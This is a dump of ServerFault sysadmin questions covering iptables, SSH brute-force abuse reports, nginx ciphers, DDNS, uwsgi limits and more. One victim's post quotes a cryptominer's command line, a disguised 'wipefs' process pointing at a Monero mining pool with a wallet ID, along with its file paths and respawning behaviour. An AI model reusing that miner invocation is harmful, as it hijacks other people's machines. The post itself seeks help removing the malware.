iptables -A POSTROUTING -t nat -s 192.168.50.1 -o eth0 -j MASQUERADE

ip_forward is 1
</code></pre>
","<linux><iptables>","2016-12-18 11:17:04"
"890731","Mounting DL160 and DL380 G6 -- rack requirements?","<p>I'm building a home lab and I'm wondering what equipment is necessary to rackmount a couple HP ProLiant servers.  I have a DL160 G6 and a DL380 G6 sitting on a table right now.  What will I need to properly mount these servers in a rack?  Also, am I looking at needing a 800mm rack?  These things are huge; they have a depth of about 30"" if I count in the cables attached.</p>
","<hp><rackmount>","2018-01-04 16:25:31"
"890739","Strange thread in Centos Server","<p>There is a strange thread called sourplum running in my CentOS server. It uses a lot of resources and affects the excel and pdf generation.</p>

<pre><code>Tasks: 280 total,   2 running, 277 sleeping,   0 stopped,   1 zombie
Cpu(s): 51.6%us,  1.0%sy,  0.0%ni, 47.3%id,  0.1%wa,  0.0%hi,  0.0%si,  0.0%st
Mem:   8030792k total,  6821428k used,  1209364k free,   892256k buffers
Swap:  4194300k total,    36712k used,  4157588k free,  3776380k cached

  PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM    TIME+  COMMAND
13170 root      20   0  613m 3544  964 S 402.1  0.0   2595:58 sourplum
25664 focu      20   0  384m  21m  14m R  9.9  0.3   0:00.65 php
 4377 root      20   0  129m  22m 3780 S  2.0  0.3   0:48.58 MONyog-bin
    1 root      20   0 19348 1372 1136 S  0.0  0.0   0:01.13 init
    2 root      20   0     0    0    0 S  0.0  0.0   0:00.00 kthreadd
    3 root      RT   0     0    0    0 S  0.0  0.0   0:00.42 migration/0
    4 root      20   0     0    0    0 S  0.0  0.0   0:01.12 ksoftirqd/0
    5 root      RT   0     0    0    0 S  0.0  0.0   0:00.00 stopper/0
    6 root      RT   0     0    0    0 S  0.0  0.0   0:00.05 watchdog/0
    7 root      RT   0     0    0    0 S  0.0  0.0   0:00.24 migration/1
</code></pre>

<p>and that there are two files of this name located</p>

<pre><code>/sourplum
/root/sourplum
</code></pre>

<p>But I was not able to find out anything regarding what this process is.</p>

<p>I tried to kill the thread but it started again automatically. I have to restart the server but it is just a temporary fix. After several hours the thread start again.</p>

<p>What should I do? Can I just delete the file? Thanks!</p>
","<centos><security><threads>","2018-01-04 17:13:00"
"821546","Does somebody know a lot of linux debian and abuse warnings?","<p>I received the last week a lot of e-mails from the company where I have a server.. Can somebody please help me to fix this 'abuse'? Using Linux Debian 8</p>

<p>We have detected abuse from the IP address XX.XX.XXX.XX, which according to a whois lookup is on your network. We would appreciate if you would investigate and take action as appropriate.</p>

<p>Log lines are given below, but please ask if you require any further information.</p>

<p>(If you are not the correct person to contact about this please accept our apologies - your e-mail address was extracted from the whois record by an automated process. This mail was generated by Fail2Ban.)</p>

<p>Note: Local timezone is +0100 (CET) Dec 16 07:06:34 jazzmessengers sshd[27500]: Connection closed by XX.XX.XXX.XX</p>

<p>Dec 16 07:06:39 jazzmessengers sshd[27581]: Failed password for root from XX.XX.XXX.XX port 35074 ssh2</p>

<p>Dec 16 07:06:41 jazzmessengers sshd[27581]: Failed password for root from XX.XX.XXX.XX port 35074 ssh2</p>

<p>Dec 16 07:06:43 jazzmessengers sshd[27581]: Failed password for root from XX.XX.XXX.XX port 35074 ssh2</p>

<p>Dec 16 07:06:43 jazzmessengers sshd[27583]: Connection closed by XX.XX.XXX.XX</p>

<p>Dec 16 09:14:58 jazzmessengers sshd[10829]: Invalid user test from XX.XX.XXX.XX</p>

<p>Dec 16 09:15:00 jazzmessengers sshd[10850]: Invalid user test from XX.XX.XXX.XX</p>

<p>Dec 16 09:15:01 jazzmessengers sshd[10829]: Failed password for invalid user test from XX.XX.XXX.XX port 40769 ssh2</p>

<p>Dec 16 09:15:02 jazzmessengers sshd[10829]: Failed password for invalid user test from XX.XX.XXX.XX port 40769 ssh2</p>

<p>Dec 16 09:15:02 jazzmessengers sshd[10831]: Connection closed by XX.XX.XXX.XX</p>

<p>Dec 16 09:15:02 jazzmessengers sshd[10850]: Failed password for invalid user test from XX.XX.XXX.XX port 44143 ssh2</p>

<p>Dec 16 09:15:04 jazzmessengers sshd[10850]: Failed password for invalid user test from XX.XX.XXX.XX port 44143 ssh2</p>

<p>Dec 16 11:17:35 jazzmessengers sshd[28958]: Invalid user samba from XX.XX.XXX.XX</p>

<p>Dec 16 11:17:38 jazzmessengers sshd[28958]: Failed password for invalid user samba from XX.XX.XXX.XX port 57529 ssh2</p>

<p>(I removed a part because Stackoverflow thought it was spam..)</p>

<p>Dec 16 17:11:40 jazzmessengers sshd[28478]: Failed password for invalid user comercial from XX.XX.XXX.XX port 46737 ssh2</p>

<p>Dec 16 17:11:40 jazzmessengers sshd[28480]: Connection closed by XX.XX.XXX.XX</p>

<p>Dec 16 17:11:40 jazzmessengers sshd[28489]: Invalid user comercial from XX.XX.XXX.XX</p>
","<linux><ssh><debian><vpn><abuse>","2016-12-19 10:30:39"
"821562","Where IP fragments are reassembled into one fragment?","<p>Reading about IP fragments found controversy between various teaching materials.</p>

<p>In book: </p>

<p><em>""Fragments need to be reassembled before they reach the transport layer at the destination.""</em></p>

<p><em>""The designers of IPv4 felt that reassembling datagrams in the routers would introduce significant complication into the protocol and put a damper on router performance.""</em></p>

<p>Online found at:
<a href=""http://www.wildpackets.com/resources/compendium/tcp_ip/ip_fragmentation"" rel=""nofollow noreferrer"">http://www.wildpackets.com/resources/compendium/tcp_ip/ip_fragmentation</a></p>

<p><em>""Once the data reaches Router #2, it will then perform reassembly of the fragments exactly as previously described and pass the reassembled block of data onto the network with the new MTU""</em></p>

<p>One source says that reassembly happens at the destination host at network layer before passing extracted payload from reassembled IP datagram to transport layer.</p>

<p>Another says that router reassembles fragments into whole IP datagram and passes it to yet another router.</p>

<p>Where the reassembly really happens? Thanks.</p>
","<routing><ip><ip-routing><ip-fragmentation>","2016-12-19 12:02:46"
"890871","What are the ways to connect to an ec2 instance in a private subnet?","<p>I have a VPC with private and public subnets and I want to ssh into one of the machines which is in the private subnets.</p>

<p>I have heard of the bastion method but want to try others too, please help me with any methods you know,</p>

<p>I also have the NAT Gateway.</p>
","<amazon-ec2><amazon-web-services><ssh-tunnel><amazon-vpc>","2018-01-05 13:49:00"
"890996","Is it possible to host a RADIUS server on Windows 7","<p>Is it possible to host a RADIUS server on <strong>Windows 7</strong>.</p>

<p>I am trying to use this as an authenticating server for my Routers. A third-party application is fine, however maybe if its possible it can use IAS or NPS?</p>

<p>I tried to enable IAS through the Windows 7 ""Turn Windows features on or off"", However I couldn't find it anywhere so maybe its not available in Windows 7?</p>
","<windows><windows-7><radius><nps><windows-ias-server>","2018-01-06 12:16:40"
"891014","block website for a specific Mac address - lede firmware router","<p>I am trying to block specific websites/urls in my home network only for specific users / Mac addresses, is this at all possible?
I have a Linksys WRT 1900 WRT v2 router running LEDE, a varient of OpenWRT.
Thanks</p>
","<linux><router><mac><blocking><filtering>","2018-01-06 14:35:58"
"821740","sftp permissions limited to primary group after update?","<p>My CentOS7 server runs sftp through openssh. Users are chrooted to a dir with subdirs that are owned by another user, but sftp users are group members through their primary or secondary groups with rwx permissions. Since a recent update they are no longer able to access folders owned by their secondary groups, but can access folders owned by their primary groups. I am suspecting an update of openssh to be responsible for this change in behaviour (6.6.1p1-25.el7_2.x86_64 to 6.6.1p1-31.el7.x86_64). Can anybody provide insight on how to troubleshoot? Suggestions on ways to solve this other than downgrading openssh (if that indeed is the cause)?</p>
","<ssh><sftp><posix>","2016-12-20 07:19:12"
"821762","disable maximum password length on Windows Server","<p>When trying to create a password longer than 16 chars on my Windows 2012 server, it is refused due to the password being to long.
I have tried looking for a GPO called ""Maximum Password Length"" - which i cannot find. The problem might be in: PwdFilt or PCNSFLT.
Screenshot of regedit where i Also looked.<a href=""https://i.sstatic.net/yiZ0q.jpg"">1</a></p>

<p>The problem is we need 36 char passwords on the SQL 2014 server we are installing to do encryption.</p>

<p>Any suggestions?</p>
","<windows><active-directory><group-policy><sql><password>","2016-12-20 09:23:05"
"891162","Can you tell who own's an IP address? Like a whois lookup but for IPs","<p>I'm renting a VPS from a company and I wanted to not be associated with this IP. Mostly for free speech reasons (life blog) to prevent doxxing.</p>

<p>Anyway I registered the domain privately, and I rented a separate VPS just for this site/others that need anonymity.</p>

<p>Again my purpose isn't to attack people, I want to speak my mind (cringe worthy thoughts, complaining about my life, poverty, etc) but not have it lead back to me so I lose my job. That sort of thing.</p>
","<ip><whois>","2018-01-08 06:19:50"
"891218","Meaning of DHCP enabled: YES","<p>I'd like to ask for some help. I'm looking on a school project and I've a question to check my active connections on my network adapters. I found my adapters through ipconfig /all and now I'd like to ask if the field ""DHCP enabled: Yes"" stands for active connection on that adapter?</p>

<p>Thank you :)</p>
","<dhcp>","2018-01-08 14:43:34"
"822020","redirect rule for http://www.example.com/http://www.example.com","<p>Checking web master tools I've found a third party has incorrectly linked to my site with a url following this pattern:</p>

<p><a href=""http://www.example.com/http://www.example.com"" rel=""nofollow noreferrer"">http://www.example.com/http://www.example.com</a></p>

<p>I added in a rule to my htaccess file, however I get a 403 forbidden response.</p>

<pre><code>RewriteRule ^http://www.example.com / [r=301,l,nc]
</code></pre>

<p>How should I go about resolving this rule?</p>

<p>Thanks</p>
","<.htaccess><301-redirect>","2016-12-21 11:49:58"
"891448","How to know if connection is made to a server using alias or not?","<p>Is there a way to know if the connection to a host is made via an alias or using the direct host name itself? This is in Linux.</p>

<p>Basically I want to find out what are the connections made to my DB server host using the direct host name itself (and not an alias)</p>

<p>Thanks
SK</p>
","<alias><serveralias>","2018-01-09 20:00:05"
"891505","Nginx ciphers settings","<p>I am trying to understand ciphers settings in nginx.</p>

<pre><code>ssl_protocols TLSv1 TLSv1.1 TLSv1.2; #What TLS types that are supported
ssl_prefer_server_ciphers on; #Use the type that the server prefers
ssl_ciphers EECDH+ECDSA+AESGCM:EECDH+aRSA+AESGCM:EECDH+ECDSA+SHA256:EECDH+aRSA+RC4:EDH+aRSA:EECDH:RC4:!aNULL:!eNULL:!LOW:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS;
</code></pre>

<p>But when it comes to the ssl_ciphers I don't understand the string. Like for example, what does <code>'EECDH+ECDSA+AESGCM'</code>,<code>'EECDH+ECDSA+SHA256'</code> and <code>'!PSK:!SRP:!DSS'</code> mean?</p>

<p>Does the data that is transferred between the client and server go through a specific encryption chain, like for example <code>'EECDH+ECDSA+SHA256'</code>?</p>

<p>Thanks for any help and guidance!</p>
","<nginx><encryption>","2018-01-10 07:15:26"
"822137","SSH connection drops","<p>I have a bunch of tiny Linux (Debian Jessie and Armbian) machines at home (Raspberry Pi, Orange Pi Zero, etc.) all connected to the broadband router. With one exception (CHIP from Next Thing Co), they refuse SSH connection after a while. It's not just that the connection drops but it's impossible to log back once it happens and I need to restart them. Needless to say, I've tried adding ServerAliveInterval and ServerAliveCountMax to /etc/ssh/sshd_config but it makes no difference. I've also tried SSH from different machines. How can I make sure I can SSH into my Linux servers any time? </p>
","<linux><ssh>","2016-12-21 20:52:32"
"891580","What is the os.uname prompt on ESXi","<p>I want to check with a python script if my system runs on an ESXi but I have never worked with one. My script should only work on ESXi but I have no clue what the cli prompt would look like or how to get it done.</p>
","<ubuntu><vmware-esxi><scripting><command-line-interface><python>","2018-01-10 14:52:37"
"822402","Ejabberd server on AWS t2.micro instance?","<p>I am just worried about the performance issues of running <code>Ejabberd</code>(XMPP) chat server on 1GB RAM and 1CPU core AWS t2.micro instance.</p>

<p><code>Ejabberd</code> documentation says it can easily accept concurrent connections of 100K to 300k if the machine has 16GB of RAM and 4 CPU cores.</p>

<p>But I have only 1GB RAM and 1CPU. If I run <code>Ejabberd</code> chat server on this machine can it withstand at least 10000 connections? And how efficient is it to run a chat server on this machine(1GB,1CPU) for 10000 connections? </p>
","<amazon-ec2><memory><central-processing-unit><ejabberd>","2016-12-23 06:34:22"
"891970","How to create iptables rule to allow IP Address with any sub directory","<p>I currently have a DigitalOcean Ubuntu 16.04x64 server with Linux Containers to house multiple sites. One of the containers has HAProxy installed and routes incoming traffic to their appropriate containers. Each container has a unique IP Address given to it upon creation. </p>

<p>I ran the following command to create a rule to the iptables nat table:</p>

<p><em>sudo iptables -t nat -I PREROUTING -i eth0 -p TCP -d your_server_ip/32 --dport 80 -j DNAT --to-destination your_haproxy_ip:80</em></p>

<p>This works correctly and any domain I have pointed to the server gets redirected to the container its supposed to go to.</p>

<p>I am currently migrating sites from another server and still need the domains pointed there until I have tested the sites on the new server. Also, for future development I would like to access the containers without having a domain name pointed to it yet.</p>

<p>So my question is, how can I edit the above command to create a rule that will allow for sub directories? For example: <em>159.203.86.144/test</em> or <em>159.203.86.144/10.23.98.211</em></p>
","<iptables><haproxy><lxc>","2018-01-12 19:45:43"
"892017","Miner bot taking up CPU on old server","<p>I've been asked to take a look at an old web server (Ubuntu 12.04) which has been running very slow recently.</p>

<p>After a quick check I found a process constantly topping the cpu:</p>

<pre><code>PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM    TIME+  COMMAND
26331 root      20   0  413m 1728 1188 S  400  0.0 740:47.17 Welcom
</code></pre>

<p>It was running from the /tmp directory where I found these 3 files</p>

<pre><code>/tmp
-rw-rw-rw-  1 root         root            11624 Dec 29 14:50 tmplog
-rwxrwxrwx  1 root         root                0 Jan  9 04:12 Wel*
-rwxrwxrwx  1 root         root          1659720 Jan  6 22:18 Welcom*
</code></pre>

<p>the tmplog file kinda suggested it was a cryptocurrency miner:</p>

<pre><code>tmplog top line
CMD: /bin/wipefs -B -o stratum+tcp://pool.minexmr.com:443 -u 45WnHu.......
</code></pre>

<p>I immediately removed the files from /tmp /bin and /etc/init.d which were linked to these executables, stopped the process and disabled root ssh login.</p>

<p>A minute or so later the Welcom file was back in /tmp and the process was up and running again.</p>

<p>I did some research and found these:</p>

<p><a href=""https://f5.com/labs/articles/threat-intelligence/malware/new-python-based-crypto-miner-botnet-flying-under-the-radar"" rel=""nofollow noreferrer"">https://f5.com/labs/articles/threat-intelligence/malware/new-python-based-crypto-miner-botnet-flying-under-the-radar</a></p>

<p><a href=""https://www.hybrid-analysis.com/sample/4d289aac77e0e2e7b8d109dd1fa4f6ac2079d64d98e97ce0b6c24462c228547e?environmentId=300"" rel=""nofollow noreferrer"">https://www.hybrid-analysis.com/sample/4d289aac77e0e2e7b8d109dd1fa4f6ac2079d64d98e97ce0b6c24462c228547e?environmentId=300</a></p>

<p>But I only managed to locate the templog wipefs from the list of files. The templog is no longer updated but the Welcom executable gets recreated in both /tmp and /bin</p>

<p>How can I get rid of this without thrashing the box? Any help would be much appreciated.</p>
","<ubuntu-12.04><malware><botnet>","2018-01-13 01:23:18"
"822540","Unable to make incoming connections when VPN is connected","<p>I have a Ubuntu router that I've recently made connect to a VPN service to get around internet filtering. The idea is to use the VPN for everything, the machine also hosts some stuff so the normal IP still needs to work. When the VPN is connected I am not able to ping the external interface from outside the network, it also hosts a webserver that can only be reached when the VPN is not connected.</p>

<p>The router sees the incoming packets but does not seem to send a reply.</p>

<p>The incoming packets don't hit the INPUT iptables chain, I see this</p>

<pre><code>Capturing on 'p5p1'
  1 0.000000000 91.121.133.139 → 86.13.39.252 TCP 74 46830→443 [SYN] Seq=0 Win=29200 Len=0 MSS=1460 SACK_PERM=1 TSval=43316855 TSecr=0 WS=128
  2 0.998501403 91.121.133.139 → 86.13.39.252 TCP 74 [TCP Retransmission] 46830→443 [SYN] Seq=0 Win=29200 Len=0 MSS=1460 SACK_PERM=1 TSval=43317105 TSecr=0 WS=128
  3 3.002695195 91.121.133.139 → 86.13.39.252 TCP 74 [TCP Retransmission] 46830→443 [SYN] Seq=0 Win=29200 Len=0 MSS=1460 SACK_PERM=1 TSval=43317606 TSecr=0 WS=128
</code></pre>

<p>but this number does not go up</p>

<pre><code>    1    44 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            multiport dports 80,443
</code></pre>

<p>Looking around it sounds like something to do with routing or connection tracking but I didn't find anyone with the exact problem.</p>

<p>Some other info that might be meaningful</p>

<p>Routing table</p>

<pre><code>Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         10.34.10.5      128.0.0.0       UG    0      0        0 tun0
0.0.0.0         86.13.39.1      0.0.0.0         UG    0      0        0 p5p1
10.34.10.1      10.34.10.5      255.255.255.255 UGH   0      0        0 tun0
10.34.10.5      0.0.0.0         255.255.255.255 UH    0      0        0 tun0
81.187.30.110   86.13.39.1      255.255.255.255 UGH   0      0        0 p5p1
81.187.30.111   86.13.39.1      255.255.255.255 UGH   0      0        0 p5p1
81.187.30.112   86.13.39.1      255.255.255.255 UGH   0      0        0 p5p1
81.187.30.113   86.13.39.1      255.255.255.255 UGH   0      0        0 p5p1
81.187.30.114   86.13.39.1      255.255.255.255 UGH   0      0        0 p5p1
81.187.30.115   86.13.39.1      255.255.255.255 UGH   0      0        0 p5p1
81.187.30.116   86.13.39.1      255.255.255.255 UGH   0      0        0 p5p1
81.187.30.117   86.13.39.1      255.255.255.255 UGH   0      0        0 p5p1
81.187.30.118   86.13.39.1      255.255.255.255 UGH   0      0        0 p5p1
81.187.30.119   86.13.39.1      255.255.255.255 UGH   0      0        0 p5p1
86.13.39.0      0.0.0.0         255.255.255.0   U     0      0        0 p5p1
90.155.3.0      86.13.39.1      255.255.255.0   UG    0      0        0 p5p1
90.155.103.0    86.13.39.1      255.255.255.0   UG    0      0        0 p5p1
104.238.169.126 86.13.39.1      255.255.255.255 UGH   0      0        0 p5p1
128.0.0.0       10.34.10.5      128.0.0.0       UG    0      0        0 tun0
185.150.144.0   86.13.39.1      255.255.252.0   UG    0      0        0 p5p1
192.168.1.0     0.0.0.0         255.255.255.0   U     0      0        0 p4p1
</code></pre>

<p>Routing rules</p>

<pre><code>jacek@saturn: ~ $ ip rule list
0:  from all lookup local 
32766:  from all lookup main 
32767:  from all lookup default
</code></pre>

<p>ifconfig</p>

<pre><code>jacek@saturn: ~ $ ifconfig 
lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
        loop  txqueuelen 1  (Local Loopback)
        RX packets 163286  bytes 151310144 (151.3 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 163286  bytes 151310144 (151.3 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

p4p1: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 192.168.1.10  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::96de:80ff:feac:6b53  prefixlen 64  scopeid 0x20&lt;link&gt;
        ether 94:de:80:ac:6b:53  txqueuelen 1000  (Ethernet)
        RX packets 64227222  bytes 90185530723 (90.1 GB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 4077370  bytes 5387966885 (5.3 GB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

p5p1: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 86.13.39.252  netmask 255.255.255.0  broadcast 255.255.255.255
        inet6 fe80::96de:80ff:feac:6b51  prefixlen 64  scopeid 0x20&lt;link&gt;
        ether 94:de:80:ac:6b:51  txqueuelen 1000  (Ethernet)
        RX packets 15457848  bytes 5153012970 (5.1 GB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1002737  bytes 205402684 (205.4 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

tun0: flags=4305&lt;UP,POINTOPOINT,RUNNING,NOARP,MULTICAST&gt;  mtu 1500
        inet 10.34.10.6  netmask 255.255.255.255  destination 10.34.10.5
        inet6 fe80::35ba:653d:44a:1dc3  prefixlen 64  scopeid 0x20&lt;link&gt;
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 100  (UNSPEC)
        RX packets 54434  bytes 63968785 (63.9 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 17087  bytes 1622925 (1.6 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</code></pre>

<p>Any advice would be much appreciated :)</p>
","<linux><iptables><vpn><routing><openvpn>","2016-12-23 22:34:37"
"822646","Updating a paid domain or subdomain to a dynamic ip","<p>i was wondering if there was a service that is totaly free that can update the subdomain registered IP adress in the registry automaticly ?</p>

<p>Like if i had a update script on the server that checks in each day or something like that ?</p>
","<domain><ip><subdomain>","2016-12-25 03:12:30"
"822658","Simple solution to get notification when certain events appear in Windows logs","<p>What is the most simple way to get a notification when specific events appear on Windows logs - anywhere on a windows network.</p>
","<security><windows-event-log>","2016-12-25 14:44:07"
"822814","Daily rsync instead of RAID 1?","<p>I'm building a small home server, and in looking at software and/or hardware RAID1 and RAID5 and ZFS  and whatever, I thought, ""what if I just rsync daily between the two internal drives?"". What are the cost/benefits of this? I like the idea of keeping the drives independent and easily expandable.</p>

<p>I would have a separate external (cloud) backup of course. Please please don't waste your time telling me RAID1 is not a backup. I know. We all know.</p>
","<raid><software-raid><hardware-raid><zfsonlinux>","2016-12-27 07:06:45"
"892295","Hardware requirement for video serving to 1000 concurrent users","<p>Can someone help us, we are looking to roll out a video on demand platform to provide internal staff the ability to view content. </p>

<p>we will need to stream to 1000 users, the video files will be 720p videos of max size typical 250MB. they will all be streaming various aspects including pre-encoded &amp; possibly encrypted videos (with codecs supplied to end users)   </p>

<p>we have been recommended the following hardware </p>

<p>Intel Xeon 3.6ghz 4 core
64GB
6x 1.2TB SAS disks &amp; 2x 800GB SSD write intensive
4x 1g NIC’s</p>

<p>but are trying to find a way to calculate the concurrent user load this server would be able to provide and any recommendations to meet our requirements.</p>
","<hardware><streaming><video-streaming>","2018-01-15 17:23:10"
"892313","Linux box that can quickly scale to many CPUs for 5 minutes?","<p>I need a Linux box with OS such as Ubuntu.</p>

<p>I want to run a benchmark that uses many CPUs. I'd like something between 32 and 96. I only need 5 minutes for the benchmark. Before and afterwards I only need a dual core or so.</p>

<p>Which instance do I need for this?</p>
","<amazon-web-services><google-cloud-platform>","2018-01-15 19:59:54"
"892453","Why my aws ec2 instance have two ip addresses?","<p>On AWS EC2 Console IPv4 address of my instance is shown as <code>52.**.**.**</code> which I use to connect via ssh and https. But <code>ifconfig</code> of this instance does not show this ip in any of network interfaces. Also, there is a <code>172.**.**.***</code> ip in output of <code>ifconfig</code> and in name of machine (<code>ubuntu@172.**.**.***</code>) but I cant connect using this address via ssh and dont understand what the address it is?</p>
","<amazon-ec2><amazon-web-services>","2018-01-16 13:55:48"
"823183","Can I install SQL Server on an external Hard Disk?","<p>I have a desktop PC (Windows 7) with 1 TB HDD which has SQL Server 2008 R2 installed. Now it is getting replaced by a laptop with 500G SSD drive. This would be first experience working with a SSD. But I have been told not to install SQL Server 2008 R2 on SSD drive. Can I buy an external hard disk and install SQL Server 2008 R2 on it? Will the database work transparently with the laptop in this way?</p>

<p>Thanks </p>
","<sql-server><hard-drive><installation><ssd>","2016-12-29 11:31:47"
"892553","uwsgi errno 24 too many open files on CentOS / nginx","<p>I have a python bottle app being served by nginx and uwsgi.</p>

<p>After running for a very few hours, I start getting a 500 error from the web app, and in /var/log/messages I see:</p>

<pre><code>uwsgi: OSError: [Errno 24] Too many open files
</code></pre>

<p>lsof for the failing process shows 1023 files open</p>

<p>I've added fs.file-max=200000 to /etc/sysctl.conf</p>

<p>I've added to /etc/security/limit.conf:</p>

<pre><code>uwsgi    soft  nofile 10000
uwsgi    hard  nofile 30000
</code></pre>

<p>I've done sysctl -p, and I've rebooted the machine. I still get the app failing when it hits 1,024 file descriptors.</p>

<p>Am I missing some uwsgi configuration, or something else? I can't seem to convince CentOS to give my app more files.</p>
","<nginx><centos7><uwsgi>","2018-01-16 21:44:57"
"892699","About to RMA my motherboard. My volumes are safe, right?","<p>As the question insinuates, I'm green to networking, but had built my own NAS box a few years ago. Here's my build for reference:</p>

<ul>
<li>ASRock C2550D4I Mini ITX Server Motherboard</li>
<li>Crucial 16GB (2 x 8GB) 240-Pin DDR3 SDRAM ECC</li>
<li>4x Seagate 4TB NAS HDD</li>
</ul>

<p>I set it up as RAID-Z2</p>

<p>Everything had always run smoothly. Upgraded to FreeNAS 11.1 STABLE release. Until about a month ago when I received the following warning on the dashboard:</p>

<blockquote>
  <p>Critical error: The boot volume state is ONLINE: One or more devices
  has experienced an error resulting in data corruption. Applications
  may be affected.</p>
</blockquote>

<p>Doing some reddit and google searches, looked like I needed to do a fresh OS install. Which I attempted, but then when I shut down the NAS box to do a reinstall of FreeNAS, my motherboard wouldn't ""POST"".  not even sure i'm describing that correct... got no VGA output, couldn't connect to the network, couldn't boot from USB. I accessed the board thru IPMI, worked with ASRock customer support, and they said I should submit an RMA and return the board under warranty (they didn't explain what it was that they saw that required a warranty claim). </p>

<p>This is fine, I suppose. <strong>But my main question is whether my data shares are safe.</strong> So far the reddit resopnse and the ASRock customer support have said they should be safe, as the motherboard and the OS dont operate on the hard drives themselves. </p>

<p>Looking for reassurance, I guess. </p>
","<raid><zfs><truenas>","2018-01-17 16:20:42"
"892730","No-IP DDNS to My Domain - What DNS Records Do I Have To Add?","<p>I have a DDNS set up at ""example.ddns.net"", which is a fixed address I can always find my own server at - but I can't seem to link it with my domain name. I'm using the domain name providers own nameservers - and I can get to a DNS management page which allows to add records like:</p>

<p>A, AAAA, C NAME ,LOC ,MX ,NAPTR ,RP ,TXT</p>

<p>Then give them a name, choose the TTL (defaulted at 14440) and input a target.</p>

<p>I've tried creating an A Record and using ""example.ddns.net"" as the target, but it wants an IP address...</p>

<p>I'm obviously barking up the wrong tree, would somebody be able to tell me what I need to do to get my domain linked up with my DDNS address... Or is it impossible to do this?</p>

<p>Many thanks, and sorry if the question is rather basic!</p>
","<domain><nameserver><a-record><ddns>","2018-01-17 18:43:33"
"892959","How to automate SSL certificates generation on remote server","<p>I am looking for a way to generate SSL certificates on an external Linux server, but can't figure out the best way.</p>

<p><strong>The scenario:</strong></p>

<p>When a user registers on a website (on a web server), I want the web server to send a message to another server where the SSL certificate and key will be generated for the user. The web server must send the <code>username</code> of the user to the external server. I know that it is better for security to generate SSL certs on a separate machine, and not on the web server.</p>

<p>The web server is also a Linux system and will use PHP, so maybe PHP should send this message to the 'ssl-generation-server'? I was thinking using a <code>BASH</code> script, and a curl command like this because it is the easiest I can come up with:</p>

<pre><code>exec(""curl http://ssl-gen-server/generate.php &gt; /dev/null 2&gt;&amp;1 &amp;"");
</code></pre>

<p>I don't want the PHP call on the web server to wait for the answer from <code>generate.php</code>, so I will redirect it, so that it would be asynchronous.</p>

<p>After the SSL and key have been generated, they should be sent back to the web server so that they can be presented to the user. But the problem here is: how can the 'ssl-gen-server' contact the web server and inform about the SSL cert?</p>

<p>Is it better to automate SSH logins from the web server to the SSL-gen server, and run commands there?</p>

<p>I know that PHP has <code>openssl_csr_new</code>, but maybe it is better to generate certificates with the actual <code>openssl</code> command? </p>
","<openssl>","2018-01-19 03:17:31"
"823645","Access a device in a different subnet","<p>I have router A connected to router B on a LAN to WAN setup.<br>
Router A is 192.168.0.1 (subnet mask 255.255.255.0)
Router B is 192.168.1.1 (subnet mask 255.255.255.255)</p>

<p>I have a NAS device connected to router A with IP 192.168.0.108.  How can I access this NAS device from a device connect to router B? (say from a device with IP 192.168.1.50)</p>

<p>Can I create a static route on router B to access the NAS?  If so what will be the Destination IP, Netmask and Gateway?</p>
","<networking><router><static-routes><d-link>","2017-01-02 02:55:03"
"893235","Nginx - open socket left in connection and worker_connections are not enough","<p>I have app in node.js.
But i have 100 users and get this error:</p>

<pre><code>first: open socket left in connection 
second: worker_connections are not enough
</code></pre>

<p>and broswer return 500 error.</p>

<p>Here is my domain.conf:</p>

<pre><code>server {
    server_name xxx.com;

    root /var/www/web;
    index index.html index.htm index.php;
    error_log /var/log/nginx/error.log;


    location / {

        proxy_http_version 1.1;
        proxy_set_header   Host $http_host;
        proxy_set_header   X-Real-IP $remote_addr;
        proxy_set_header   Upgrade $http_upgrade;
        proxy_set_header   Connection ""upgrade"";
        proxy_cache_bypass $http_upgrade;
        proxy_pass         http://127.0.0.1:7777;

    }



    listen 443 ssl; # managed by Certbot
    ssl_certificate /etc/letsencrypt/live/xxx.com/fullchain.pem; # managed by Certbot
    ssl_certificate_key /etc/letsencrypt/live/xxx.com/privkey.pem; # managed by Certbot
    include /etc/letsencrypt/options-ssl-nginx.conf; # managed by Certbot
    ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem; # managed by Certbot

}
    server {
        listen 80;
        server_name xxx.com;
        return 301 https://$host$request_uri; # managed by Certbot

    }
</code></pre>
","<linux><nginx><debian><ssl>","2018-01-20 17:04:53"
"893244","Why do my sub domains point to other sub domains when I disable a site?","<p>I have a personal server and I use many sub-domains on it.<br>
Each sub domain has its own unique SSL cert setup with <strong>LetsEncrypt</strong>.<br>
Each sub domain has its own vhost file under <code>/etc/apache/sites-available/</code><br>
Each sub domain has its own A record and NS record that point to my server.  </p>

<p>For some reason, if I disable one of my subdomains (e.g. <code>sub1.domain.com</code>) using the a2dissite command, and then try to go to that site in a web browser, I get an error saying: </p>

<blockquote>
  <p><strong>sub1</strong>.domain.com uses an invalid security certificate.<br>
  The certificate is only valid for <strong>sub2</strong>.domain.com<br>
  Error code: SSL_ERROR_BAD_CERT_DOMAIN</p>
</blockquote>

<p>I have verified that the VHOST files do use their appropriate SSL files. And the VHOST files also have the appropriate server name, including the sub domain part.</p>

<p>If I add an exception to the above error, as is an option, I am presented with another one of my subdomains but the URL stays the same as the one that's disabled. </p>

<p>Why does my server point me to a completely different sub-domain when I disable the site? I would think that it would just say it can't be reached, but instead it redirects me to another one of my sub-domains and I'm not sure how to control that.  </p>
